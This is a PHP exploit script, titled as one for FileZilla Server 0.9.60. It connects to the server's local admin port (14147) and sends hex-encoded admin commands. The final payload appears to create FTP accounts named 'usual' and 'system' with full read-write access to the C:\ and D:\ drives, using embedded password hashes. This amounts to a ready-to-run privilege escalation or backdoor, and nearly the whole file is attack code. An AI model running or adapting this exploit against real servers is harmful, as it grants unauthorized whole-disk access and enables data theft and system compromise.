<?php
function hextostr($hex){
    $string='';
    for ($i=0; $i < strlen($hex)-1; $i+=2){
        $string .= chr(hexdec($hex[$i].$hex[$i+1]));
    }
    return $string;
}
function String2Hex($string){
    $hex='';
    for ($i=0; $i < strlen($string); $i++){
        $hex .= dechex(ord($string[$i]));
    }
    return $hex;
}
error_reporting(E_ALL);
echo "<h2>Filezilla(0.9.60) local admin port exploit</h2><br>";
$service_port = 14147;
$address = '127.0.0.1';

$socket = socket_create(AF_INET, SOCK_STREAM, SOL_TCP);
socket_set_option($socket,SOL_SOCKET, SO_RCVTIMEO, array("sec"=>2, "usec"=>0));
if ($socket === false) {
	echo "socket_create() failed: reason: " . socket_strerror(socket_last_error()) . "<br>";
} else {
	echo "OK. <br>";
}

echo "Attempting to connect to '$address' on port '$service_port'...";
$result = socket_connect($socket, $address, $service_port);
if($result === false) {
	echo "socket_connect() failed.<br>Reason: ($result) " . socket_strerror(socket_last_error($socket)) . "<br>";
} else {
	echo "OK <br>";
}
sleep(5);
/*
while ($out = socket_read($socket, 15)) {
	echo "out: " . $out . "<br>";
}
socket_close($socket);
die();
*/
$out = "";
$out = socket_read($socket, 1024);
echo "out: " . bin2hex($out) . "<br>";
$in = hextostr("0800000000");
echo "sending http head request ...";
socket_write($socket, $in, strlen($in));
echo  "OK<br>";
//sleep(1);
$out = socket_read($socket, 1024);
echo "out: " . bin2hex($out) . "<br>";

$in = hextostr("0c0100000000");
echo "sending http head request ...";
socket_write($socket, $in, strlen($in));
echo  "OK<br>";
//sleep(2);
$out = socket_read($socket, 1024);
echo "out: " . bin2hex($out) . "<br>";

$in = hextostr("1800000000");
echo "sending http head request ...";
socket_write($socket, $in, strlen($in));
echo  "OK<br>";
$out = socket_read($socket, 1024);
echo "out: " . bin2hex($out) . "<br>";
$in = hextostr("2000000000");
echo "sending http head request ...";
socket_write($socket, $in, strlen($in));
echo  "OK<br>";
$out = socket_read($socket, 1024);
echo "out: " . bin2hex($out) . "<br>";
$in = hextostr("18ea01000000000000000200000000000000000000040000000000010002443a000001ff01000a000001000a00000000000005757375616c008042374335364146344231373635424239314641373034364245443837374238333835374130413339364535443243464436313042374334374342413135363436413943384342354143384438393035353346303738373934354131314338373633383732433037323733373742374232303735373438463735454246333146370040616c35402379754e574e6229383f75465c6852432a636c344e425c2f3445322a2c582a53282b31226f45656c343e7b29384024645f5c4f70216676482c715c7c00000000000000000000040000000000010003433a5c000001ff00000a000000000a0000000000000673797374656d008043324334453341444243373244313132373745333941414242374141324132393034323436303142414243383035443945354144343039384146363430433639334536374644304335313435414138453832313043304533414133323345423745463632343231383333463746393130373846333439443645373843414237430040664d246f3e3e2d47717e647c4c7945303c3c3142237158317625452867297a7a31322f2879592c5828634276672c4c3b662e324965603550257c736c73453a52");
echo "sending http head request ...";
socket_write($socket, $in, strlen($in));
echo  "OK<br>";
$out = socket_read($socket, 1024);
echo "out: " . bin2hex($out) . "<br>";
echo "All done.<br><br>";
echo "closeing socket..";
socket_close($socket);
echo "ok .<br><br>";
